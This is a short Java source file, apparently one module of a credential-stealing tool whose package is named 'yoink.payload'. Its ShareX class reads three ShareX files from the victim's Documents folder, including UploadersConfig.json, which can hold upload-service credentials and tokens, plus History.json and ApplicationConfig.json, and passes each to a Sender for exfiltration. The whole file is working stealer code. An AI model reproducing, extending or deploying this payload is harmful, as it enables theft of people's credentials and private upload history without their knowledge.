package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.FileUtil;

public final
class ShareX implements Payload {
    @Override
    public
    void execute () {
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "UploadersConfig.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "History.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "ApplicationConfig.json").ifPresent(Sender::send);
    }
}